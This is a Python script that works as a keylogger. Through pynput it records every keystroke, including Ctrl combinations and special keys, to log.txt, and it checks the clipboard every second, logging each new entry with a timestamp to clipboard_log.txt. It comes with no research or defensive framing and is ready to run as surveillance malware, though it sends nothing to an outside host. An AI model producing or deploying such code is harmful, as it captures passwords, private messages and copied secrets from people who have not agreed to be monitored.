from pynput.keyboard import Listener, Key
import pyperclip
import datetime
import os
import time

previous_clipboard_content = ""

special_commands = {
    "Key.space": " ",
    "Key.enter": "\n",
    "Key.right": '\n[->]\n',
    "Key.left": '\n[<-]\n',
    "Key.up": '\n[^]\n',
    "Key.down": '\n[v]\n',
    "Key.shift": "\n[SHIFT]",
    "Key.alt": "\n[ALT]",
    "Key.ctrl": "\n[CTRL]",
    "Key.cmd": "\n[Windows key or Command key on macOS]\n",
    "Key.alt_gr": "\n[right Alt key]",
    "Key.tab": "\t",
    "Key.backspace": "\n[BACKSPACE]\n",
    "Key.delete": "\n[DELETE]\n",
    "Key.esc": "\n[ESC]\n",
    "Key.insert": "\n[INSERT]\n",
    "Key.home": "\n[HOME]\n",
    "Key.end": "\n[END]\n",
    "Key.page_up": "\n[PAGE UP]\n",
    "Key.page_down": "\n[PAGE DOWN]\n",
    "Key.pause": "\n[PAUSE]\n",
    "Key.print_screen": "\n[PRINT SCREEN]\n",
    "Key.scroll_lock": "\n[SCROLL LOCK]\n",
    "Key.caps_lock": "\n[CAPS LOCK]\n",
    "Key.num_lock": "\n[NUM LOCK]\n",
    "Key.f1": "\n[F1]\n",
    "Key.f2": "\n[F2]\n",
    "Key.f3": "\n[F3]\n",
    "Key.f4": "\n[F4]\n",
    "Key.f5": "\n[F5]\n",
    "Key.f6": "\n[F6]\n",
    "Key.f7": "\n[F7]\n",
    "Key.f8": "\n[F8]\n",
    "Key.f9": "\n[F9]\n",
    "Key.f10": "\n[F10]\n",
    "Key.f11": "\n[F11]\n",
    "Key.f12": "\n[F12]\n",
    "Key.media_play_pause": "\n[MEDIA PLAY PAUSE]\n",
    "Key.media_volume_mute": "\n[MEDIA VOLUME MUTE]\n",
    "Key.media_volume_up": "\n[MEDIA VOLUME UP]\n",
    "Key.media_volume_down": "\n[MEDIA VOLUME DOWN]\n",
    "Key.media_previous": "\n[MEDIA PREVIOUS]\n",
    "Key.media_next": "\n[MEDIA NEXT]\n",
    "Key.ctrl_l": "\n[left Control key]",
    "Key.ctrl_r": "\n[right Control key]",
    "Key.shift_l": "\n[left Shift key]",
    "Key.shift_r": "\n[right Shift key]",
    "Key.alt_l": "\n[left Alt key]",
    "Key.alt_r": "\n[right Alt key]"
}

hex_to_key = {
    0x01: 'A', 
    0x02: 'B', 
    0x03: 'C', 
    0x04: 'D',
    0x05: 'E',
    0x06: 'F',  
    0x07: 'G', 
    0x08: 'H', 
    0x09: 'I',
    0x0a: 'J',
    0x0b: 'K', 
    0x0c: 'L',
    0x0d: 'M', 
    0x0e: 'N',
    0x0f: 'O', 
    0x10: 'P',
    0x11: 'Q',   
    0x12: 'R',
    0x13: 'S', 
    0x14: 'T',
    0x15: 'U',
    0x16: 'V',
    0x17: 'W',
    0x18: 'X',  
    0x19: 'Y',  
    0x1a: 'Z'
}
def write_in_file(key):
    keydata = str(key).replace("'", "")
    
    if keydata in special_commands:
        keydata = special_commands[keydata]
    else:
        keydata = hex_to_key.get(int(keydata, 16), keydata) if keydata.startswith('\\x') else keydata
    
    with open("log.txt", "a") as file:
        file.write(keydata)


def log_clipboard_content():
    global previous_clipboard_content
    clipboard_content = pyperclip.paste()

    if clipboard_content != previous_clipboard_content:
        previous_clipboard_content = clipboard_content
        with open("clipboard_log.txt", "a") as file:
            file.write(f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {clipboard_content}\n")


def on_press(key):
    keydata = str(key).replace("'", "")
    if keydata.startswith('\\x'):
        hex_value = int(keydata[2:], 16)
        key = hex_to_key.get(hex_value, keydata)
        if key:
            write_in_file(f"[+{key}]")
    else:
        write_in_file(key)




def main():
    with Listener(on_press=on_press) as listener:
        try:
            while True:
                log_clipboard_content()
                time.sleep(1)
        except KeyboardInterrupt:
            print("Program interrupted. Exiting...")
        finally:
            listener.stop()
            listener.join()


if __name__ == "__main__":
    main()